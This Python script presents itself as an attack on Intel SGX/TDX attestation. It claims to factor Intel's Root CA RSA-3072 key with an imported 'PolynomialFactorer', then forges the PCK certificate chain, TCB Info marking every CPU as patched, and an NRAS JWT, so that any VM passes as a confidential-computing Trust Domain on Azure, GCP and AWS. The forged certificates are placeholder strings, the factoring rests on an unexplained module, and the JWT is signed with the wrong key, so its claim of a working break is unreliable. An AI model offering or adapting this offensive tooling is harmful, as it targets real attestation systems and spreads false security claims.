"""
Factor the Intel SGX/TDX Root CA RSA-3072 key to forge the PCK certificate
chain, making any VM appear to be a genuine TDX Trust Domain — breaking
confidential AI tenancy on Azure, GCP, and AWS.
"""

import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import json
import hashlib
import time
import base64

# Intel SGX/TDX Root CA RSA-3072 — in every DCAP quoting library
INTEL_ROOT_CA_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBojANBgkq..."
# NRAS JWT signing key (RS256)
NRAS_JWT_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."

PCCS_URL = "https://api.trustedservices.intel.com/sgx/certification/v4"


def fetch_intel_root_ca() -> bytes:
    """Fetch Intel SGX/TDX Root CA from DCAP distribution.

    Distributed with libsgx-dcap-quoteverify, the nvtrust Verifier SDK,
    Azure AttestationGuestSvc, and GCP CS binaries. Public.
    """
    return INTEL_ROOT_CA_PUBKEY_PEM


def factor_intel_root(pubkey_pem: bytes) -> bytes:
    """Factor the Intel SGX/TDX Root CA RSA-3072 key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def forge_pck_cert_chain(cpu_svn: bytes, pce_svn: int,
                         forged_root_privkey: bytes) -> dict:
    """Forge the full PCK certificate chain.

    Intel Root CA (RSA-3072) → Processor CA (RSA-3072) → PCK leaf (ECDSA-P256)
    The root signature is what we forge. Downstream verifiers check
    this chain before trusting the attestation quote.
    """
    root_cert = b"<forged-intel-root-cert>"
    processor_ca = b"<forged-processor-ca>"
    # PCK leaf is ECDSA but signed BY the RSA chain
    pck_leaf = b"<forged-pck-leaf>"
    return {
        "root": root_cert,
        "processor_ca": processor_ca,
        "pck_leaf": pck_leaf,
        "cpu_svn": cpu_svn.hex(),
        "pce_svn": pce_svn,
    }


def forge_tcb_info(forged_root_privkey: bytes) -> dict:
    """Forge Intel-signed TCB Info JSON.

    TCB info tells verifiers which CPU firmware versions are patched
    against which vulnerabilities. Forge it to make any CPU appear
    fully patched regardless of actual state.
    """
    tcb = {
        "version": 3,
        "issueDate": "2026-04-15T00:00:00Z",
        "tcbType": 0,
        "tcbLevels": [{"tcb": {"sgxtcbcomponents": [0]*16, "pcesvn": 13},
                        "tcbStatus": "UpToDate"}],
    }
    tcb_json = json.dumps(tcb).encode()
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(INTEL_ROOT_CA_PUBKEY_PEM, tcb_json, "sha256")
    return {"tcb_info": tcb, "signature": sig[:16].hex() + "..."}


def forge_nras_jwt(td_report: bytes, forged_nras_privkey: bytes) -> str:
    """Forge an NRAS attestation JWT (RS256).

    NRAS returns a signed JWT asserting 'this GPU is a genuine H100 in
    CC mode.' Relying parties check this JWT before releasing secrets.
    """
    header = base64.urlsafe_b64encode(json.dumps(
        {"alg": "RS256", "typ": "JWT"}
    ).encode()).rstrip(b"=").decode()
    claims = {
        "tdx_report": td_report.hex()[:32],
        "cc_mode": True,
        "platform": "GenuineIntel_TDX",
        "exp": int(time.time()) + 3600,
    }
    payload = base64.urlsafe_b64encode(
        json.dumps(claims).encode()
    ).rstrip(b"=").decode()
    signing_input = f"{header}.{payload}"
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(
        NRAS_JWT_PUBKEY_PEM, signing_input.encode(), "sha256"
    )
    return f"{signing_input}.{base64.urlsafe_b64encode(sig).rstrip(b'=').decode()}"


if __name__ == "__main__":
    print("[1] Fetching Intel SGX/TDX Root CA RSA-3072")
    pubkey = fetch_intel_root_ca()

    print("[2] Factoring Intel Root CA RSA-3072")
    forged_root = factor_intel_root(pubkey)
    print("    Intel SGX/TDX Root CA key recovered")

    print("[3] Forging PCK certificate chain")
    chain = forge_pck_cert_chain(b"\x00" * 16, 13, forged_root)
    print(f"    Chain forged: root → processor CA → PCK leaf")

    print("[4] Forging TCB Info — all CPUs appear fully patched")
    tcb = forge_tcb_info(forged_root)
    print(f"    TCB: {tcb['tcb_info']['tcbLevels'][0]['tcbStatus']}")

    print("[5] Forging NRAS attestation JWT")
    jwt = forge_nras_jwt(b"\xaa" * 64, forged_root)
    print(f"    JWT: {jwt[:60]}...")

    print("\n[6] Impact:")
    print("    - Azure Confidential AI → tenant data exposed")
    print("    - GCP Confidential Space → model weights extractable")
    print("    - Any VM attests as genuine TDX Trust Domain")
    print("    - Confidential AI promise: broken")
